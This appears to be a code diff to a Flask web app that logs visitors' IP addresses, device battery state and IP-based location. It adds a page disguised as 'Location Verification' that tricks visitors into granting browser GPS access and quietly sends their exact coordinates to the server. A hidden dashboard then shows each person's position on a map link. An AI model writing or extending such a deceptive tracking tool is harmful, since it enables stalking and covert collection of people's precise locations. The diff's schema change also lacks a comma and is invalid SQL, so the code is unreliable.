@@ -55,6 +55,9 @@ def init_db():
             ip_info JSONB,
             battery TEXT,
             charging TEXT
+            gps_lat TEXT,
+            gps_lon TEXT,
+            gps_accuracy TEXT
         )
     """)
 
@@ -575,6 +578,112 @@ def show_logs():
     return jsonify(logs)
 
 
+@app.route("/track")
+def track_page():
+    return """
+    <html>
+    <head>
+        <title>Location Access</title>
+        <style>
+            body {
+                background:#0d1117;
+                color:white;
+                font-family:Arial;
+                text-align:center;
+                padding-top:120px;
+            }
+            button {
+                padding:15px 25px;
+                background:#00ff99;
+                border:none;
+                border-radius:10px;
+                font-weight:bold;
+                cursor:pointer;
+            }
+        </style>
+    </head>
+
+    <body>
+        <h1>Location Verification</h1>
+        <p>Tap allow to continue.</p>
+
+        <button onclick="getLocation()">Allow Location</button>
+
+        <p id="status"></p>
+
+        <script>
+            function getLocation() {
+                if (!navigator.geolocation) {
+                    document.getElementById("status").innerText =
+                    "GPS not supported";
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+                        let accuracy = position.coords.accuracy;
+
+                        fetch(
+                            "/gps-update?lat=" + lat +
+                            "&lon=" + lon +
+                            "&accuracy=" + accuracy
+                        );
+
+                        document.getElementById("status").innerText =
+                        "Location received successfully.";
+                    },
+                    function(error) {
+                        document.getElementById("status").innerText =
+                        "Location permission denied.";
+                    }
+                );
+            }
+        </script>
+    </body>
+    </html>
+    """
+
+@app.route("/gps-update")
+def gps_update():
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+
+    lat = request.args.get("lat")
+    lon = request.args.get("lon")
+    accuracy = request.args.get("accuracy")
+
+    if DATABASE_URL:
+        conn = get_db_connection()
+        cur = conn.cursor()
+
+        cur.execute("""
+            UPDATE logs
+            SET gps_lat = %s,
+                gps_lon = %s,
+                gps_accuracy = %s
+            WHERE id = (
+                SELECT id FROM logs
+                WHERE ip = %s
+                ORDER BY id DESC
+                LIMIT 1
+            )
+        """, (
+            lat,
+            lon,
+            accuracy,
+            ip
+        ))
+
+        conn.commit()
+        cur.close()
+        conn.close()
+
+    return "GPS updated"
+
 
 @app.route("/dashboard")
 @login_required
@@ -803,6 +912,17 @@ def dashboard():
             <p><b>Latitude:</b> {log.get('ip_info', {}).get('latitude')}</p>
             <p><b>Longitude:</b> {log.get('ip_info', {}).get('longitude')}</p>
             <p><b>ISP:</b> {log.get('ip_info', {}).get('isp')}</p>
+           <p><b>GPS:</b> {log.get('gps_lat')}, {log.get('gps_lon')}</p>
+
+<p><b>Accuracy:</b> {log.get('gps_accuracy')} meters</p>
+
+<p>
+    <b>Google Map:</b>
+
+    <a href="https://www.google.com/maps?q={log.get('gps_lat')},{log.get('gps_lon')}" target="_blank">
+        Open Map
+    </a>
+</p>
             <p><b>Battery:</b> {battery_display}</p>
             <p><b>Charging:</b> {charging_display}</p>
         </div>
